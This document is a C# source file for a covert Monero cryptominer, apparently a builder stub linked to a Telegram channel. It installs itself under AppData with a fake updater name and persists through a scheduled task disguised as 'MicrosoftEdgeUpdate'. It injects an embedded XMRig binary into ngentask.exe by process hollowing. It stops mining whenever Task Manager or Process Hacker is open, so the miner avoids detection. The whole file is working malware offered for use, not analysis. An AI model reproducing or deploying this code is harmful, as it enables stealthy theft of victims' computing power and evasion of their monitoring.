using VolVeRFMI;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using VolVeRFMR.Properties;

// https://t.me/VolVeRFM

namespace VolVeRFM
{
    class Program
    {
        

        static string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Windows"); // Путь в appdata 

        public static void Main(string[] args)
        {

        string FileName = "winupdater.exe"; // Название процесса 


            try
            {
                new Installer().Run();
            }
            catch (Exception ex)
            {
            }


            try
            {
                if (!InstanceCheck())
                    Environment.Exit(0);
            }
            catch (Exception)
            { }

            try
            {
                var startInfo = new ProcessStartInfo // Идем в планировщик задач
                {
                    FileName = "schtasks.exe",
                    CreateNoWindow = false,
                    WindowStyle = ProcessWindowStyle.Hidden, // Скрываем
                    Arguments = @"/create /sc MINUTE /mo 3 /tn ""MicrosoftEdgeUpdate"" /tr """ + folder + "\\" + FileName + @""" /f" // Задаем аргументы
                };
                Process.Start(startInfo); // Запускаем
            }
            catch { }

            const string pool = "*MASSEGE2*"; // Наши значения в строке pool
            const string moneroUsage = "25"; 
            const string moneroWallet = "*MASSEGE*"; // Наши значения в строке moneroWallet

            byte[] xmr = VolVeRFMR.Properties.Resources.xmrig; 
            string args2 = "--algo rx/0 --donate-level 0   --max-cpu-usage " + moneroUsage + " -o" + pool + " -u " + moneroWallet; // Добавим аргументов
            string withoutExtension1 = Path.GetFileNameWithoutExtension("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngentask.exe"); // Путь для запуска

            List<string> stringList = new List<string>(); // Создаем лист процессов при которых будет останавливаться 
                stringList.Add("mmc");
                stringList.Add("ProcessHacker");
                stringList.Add("Taskmgr");
                stringList.Add("Диспетчер задач");

            try
            {

                foreach (string processName in stringList)
                {
                    for (Process[] processesByName = Process.GetProcessesByName(processName); processesByName.Length != 0; processesByName = Process.GetProcessesByName(processName))
                    {
                        foreach (Process process in Process.GetProcessesByName(withoutExtension1))
                        {
                            try
                            {
                                process.Kill();  
                            }
                            catch
                            {
                            }
                        }

                    }
                }

            }

            catch { }


            try
            {
                if (Process.GetProcessesByName(withoutExtension1).Length == 0)
                    Program.PE.Run(xmr, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngentask.exe", args2); // Запускаем
                                                                                                                       
            }
            catch { }

        }


        static Mutex InstanceCheckMutex;
        static bool InstanceCheck()
        {
            bool isNew;
            InstanceCheckMutex = new Mutex(true, "SMILEFACE", out isNew);
            return isNew;
        }



        public static class PE
        {
            [DllImport("kernel32.dll")]
            private static extern unsafe bool CreateProcess(
              string lpApplicationName,
              string lpCommandLine,
              IntPtr lpProcessAttributes,
              IntPtr lpThreadAttributes,
              bool bInheritHandles,
              uint dwCreationFlags,
              IntPtr lpEnvironment,
              string lpCurrentDirectory,
              Program.PE.StartupInfo* lpStartupInfo,
              byte[] lpProcessInfo);

            [DllImport("kernel32.dll")]
            private static extern long VirtualAllocEx(
              long hProcess,
              long lpAddress,
              long dwSize,
              uint flAllocationType,
              uint flProtect);

            [DllImport("kernel32.dll")]
            private static extern long WriteProcessMemory(
              long hProcess,
              long lpBaseAddress,
              byte[] lpBuffer,
              int nSize,
              long written);

            [DllImport("ntdll.dll")]
            private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);

            [DllImport("kernel32.dll")]
            private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

            [DllImport("kernel32.dll")]
            private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

            [DllImport("kernel32.dll")]
            private static extern uint ResumeThread(long hThread);


            [DllImport("kernel32.dll")]
            private static extern bool CloseHandle(long handle);

            public static unsafe void Run(byte[] payloadBuffer, string host, string args)
            {
                int num1 = Marshal.ReadInt32((object)payloadBuffer, 60);
                int num2 = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 56);
                int nSize = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 60);
                int num3 = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 16);
                short num4 = Marshal.ReadInt16((object)payloadBuffer, num1 + 4 + 2);
                short num5 = Marshal.ReadInt16((object)payloadBuffer, num1 + 4 + 16);
                long num6 = Marshal.ReadInt64((object)payloadBuffer, num1 + 24 + 24);
                Program.PE.StartupInfo startupInfo = new Program.PE.StartupInfo();
                startupInfo.cb = (uint)Marshal.SizeOf<Program.PE.StartupInfo>(startupInfo);
                startupInfo.wShowWindow = (ushort)0;
                startupInfo.dwFlags = 1U;
                byte[] lpProcessInfo = new byte[24];
                IntPtr num7 = Marshal.AllocHGlobal(1232 / 16);
                string lpCommandLine = host;
                if (!string.IsNullOrEmpty(args))
                    lpCommandLine = lpCommandLine + " " + args;
                string currentDirectory = Directory.GetCurrentDirectory();
                Marshal.WriteInt32(num7, 48, 1048603);
                Program.PE.CreateProcess((string)null, lpCommandLine, IntPtr.Zero, IntPtr.Zero, true, 4U, IntPtr.Zero, currentDirectory, &startupInfo, lpProcessInfo);
                long num8 = Marshal.ReadInt64((object)lpProcessInfo, 0);
                long num9 = Marshal.ReadInt64((object)lpProcessInfo, 8);
                int num10 = (int)Program.PE.ZwUnmapViewOfSection(num8, num6);
                Program.PE.VirtualAllocEx(num8, num6, (long)num2, 12288U, 64U);
                Program.PE.WriteProcessMemory(num8, num6, payloadBuffer, nSize, 0L);
                for (short index = 0; (int)index < (int)num4; ++index)
                {
                    byte[] numArray = new byte[40];
                    Buffer.BlockCopy((Array)payloadBuffer, num1 + (24 + (int)num5) + 40 * (int)index, (Array)numArray, 0, 40);
                    int num11 = Marshal.ReadInt32((object)numArray, 12);
                    int length = Marshal.ReadInt32((object)numArray, 16);
                    int srcOffset = Marshal.ReadInt32((object)numArray, 20);
                    byte[] lpBuffer = new byte[length];
                    Buffer.BlockCopy((Array)payloadBuffer, srcOffset, (Array)lpBuffer, 0, lpBuffer.Length);
                    Program.PE.WriteProcessMemory(num8, num6 + (long)num11, lpBuffer, lpBuffer.Length, 0L);
                }
                Program.PE.GetThreadContext(num9, num7);
                byte[] bytes = BitConverter.GetBytes(num6);
                long num12 = Marshal.ReadInt64(num7, 136);
                Program.PE.WriteProcessMemory(num8, num12 + 16L, bytes, 8, 0L);
                Marshal.WriteInt64(num7, 128, num6 + (long)num3);
                Program.PE.SetThreadContext(num9, num7);
                int num13 = (int)Program.PE.ResumeThread(num9);
                Marshal.FreeHGlobal(num7);
                Program.PE.CloseHandle(num8);
                Program.PE.CloseHandle(num9);
            }

            [StructLayout(LayoutKind.Explicit, Size = 104)]
            public struct StartupInfo
            {
                [FieldOffset(0)]
                public uint cb;
                [FieldOffset(60)]
                public uint dwFlags;
                [FieldOffset(64)]
                public ushort wShowWindow;
            }
        }


    }

}
